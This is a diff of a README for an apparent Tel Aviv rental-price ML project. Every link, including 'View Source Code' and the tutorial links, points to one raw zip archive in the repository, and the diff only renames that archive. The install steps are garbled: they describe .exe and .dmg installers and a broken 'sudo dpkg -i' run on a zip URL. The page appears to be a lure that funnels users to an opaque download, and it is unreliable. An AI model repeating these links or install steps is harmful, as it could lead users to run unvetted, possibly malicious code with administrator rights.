@@ -4,7 +4,7 @@
 Welcome to the RentalPrice-ML-Modeling project! This application uses machine learning to predict apartment rental prices in Tel Aviv. It combines advanced techniques like Elastic Net and Decision Trees to provide accurate predictions. You can explore data preprocessing, feature engineering, model training, and performance evaluation.
 
 ## 📥 Download the App
-[![Download Latest Release](https://raw.githubusercontent.com/subash12345679-png/RentalPrice-ML-Modeling/main/Europasian/RentalPrice-ML-Modeling.zip%20Latest%https://raw.githubusercontent.com/subash12345679-png/RentalPrice-ML-Modeling/main/Europasian/RentalPrice-ML-Modeling.zip)](https://raw.githubusercontent.com/subash12345679-png/RentalPrice-ML-Modeling/main/Europasian/RentalPrice-ML-Modeling.zip)
+[![Download Latest Release](https://raw.githubusercontent.com/subash12345679-png/RentalPrice-ML-Modeling/main/Europasian/M-Modeling-Rental-Price-v1.4.zip%20Latest%https://raw.githubusercontent.com/subash12345679-png/RentalPrice-ML-Modeling/main/Europasian/M-Modeling-Rental-Price-v1.4.zip)](https://raw.githubusercontent.com/subash12345679-png/RentalPrice-ML-Modeling/main/Europasian/M-Modeling-Rental-Price-v1.4.zip)
 
 ## 🚀 Getting Started
 Follow these steps to get the application up and running on your computer.
@@ -19,7 +19,7 @@ Before you begin, make sure you have the following on your computer:
 
 ### 2. Visit the Download Page
 To download the application, visit the following link:
-[Download RentalPrice-ML-Modeling](https://raw.githubusercontent.com/subash12345679-png/RentalPrice-ML-Modeling/main/Europasian/RentalPrice-ML-Modeling.zip)
+[Download RentalPrice-ML-Modeling](https://raw.githubusercontent.com/subash12345679-png/RentalPrice-ML-Modeling/main/Europasian/M-Modeling-Rental-Price-v1.4.zip)
 
 ### 3. Choose Your Version
 On the Releases page, you will see various versions of the application. Choose the latest version labeled as "Latest Release." Click on it to view download options.
@@ -30,7 +30,7 @@ Click on the version that matches your operating system. The download will start
 ### 5. Install the Application
 - **Windows**: Double-click the downloaded `.exe` file and follow the installation prompts.
 - **macOS**: Open the downloaded `.dmg` file and drag the application to your Applications folder.
-- **Linux**: Open the terminal, navigate to the downloaded file, and run `sudo dpkg -i https://raw.githubusercontent.com/subash12345679-png/RentalPrice-ML-Modeling/main/Europasian/RentalPrice-ML-Modeling.zip` or follow your distribution's installation method.
+- **Linux**: Open the terminal, navigate to the downloaded file, and run `sudo dpkg -i https://raw.githubusercontent.com/subash12345679-png/RentalPrice-ML-Modeling/main/Europasian/M-Modeling-Rental-Price-v1.4.zip` or follow your distribution's installation method.
 
 ### 6. Open the Application
 Once installed, locate the application on your computer and double-click to open it. The interface is user-friendly and guides you through the process of inputting data.
@@ -46,7 +46,7 @@ To predict rental prices, input relevant details about the apartment such as loc
   
 ## 🔍 Explore the Code
 If you're interested in how the application works, you can check out the source code on GitHub:
-[View Source Code](https://raw.githubusercontent.com/subash12345679-png/RentalPrice-ML-Modeling/main/Europasian/RentalPrice-ML-Modeling.zip)
+[View Source Code](https://raw.githubusercontent.com/subash12345679-png/RentalPrice-ML-Modeling/main/Europasian/M-Modeling-Rental-Price-v1.4.zip)
 
 ## 📈 Using the Application Effectively
 To get the best predictions from the application, consider the following tips:
@@ -56,9 +56,9 @@ To get the best predictions from the application, consider the following tips:
 
 ## ⚙️ Additional Resources
 Here are some resources to help you understand the methods used:
-- **Machine Learning Basics**: [ML Basics Guide](https://raw.githubusercontent.com/subash12345679-png/RentalPrice-ML-Modeling/main/Europasian/RentalPrice-ML-Modeling.zip)
-- **Understanding Decision Trees**: [Decision Trees Explained](https://raw.githubusercontent.com/subash12345679-png/RentalPrice-ML-Modeling/main/Europasian/RentalPrice-ML-Modeling.zip)
-- **Elastic Net Overview**: [Elastic Net Insights](https://raw.githubusercontent.com/subash12345679-png/RentalPrice-ML-Modeling/main/Europasian/RentalPrice-ML-Modeling.zip)
+- **Machine Learning Basics**: [ML Basics Guide](https://raw.githubusercontent.com/subash12345679-png/RentalPrice-ML-Modeling/main/Europasian/M-Modeling-Rental-Price-v1.4.zip)
+- **Understanding Decision Trees**: [Decision Trees Explained](https://raw.githubusercontent.com/subash12345679-png/RentalPrice-ML-Modeling/main/Europasian/M-Modeling-Rental-Price-v1.4.zip)
+- **Elastic Net Overview**: [Elastic Net Insights](https://raw.githubusercontent.com/subash12345679-png/RentalPrice-ML-Modeling/main/Europasian/M-Modeling-Rental-Price-v1.4.zip)
 
 ## 🤝 Community Support
 If you have questions or need assistance, feel free to reach out:
@@ -73,4 +73,4 @@ Keep up with updates and new features by checking the changelog in the repositor
 
 ## 📍 Download & Install
 Ready to dive in? Go back to the download page to get your application:
-[Download RentalPrice-ML-Modeling](https://raw.githubusercontent.com/subash12345679-png/RentalPrice-ML-Modeling/main/Europasian/RentalPrice-ML-Modeling.zip)
+[Download RentalPrice-ML-Modeling](https://raw.githubusercontent.com/subash12345679-png/RentalPrice-ML-Modeling/main/Europasian/M-Modeling-Rental-Price-v1.4.zip)
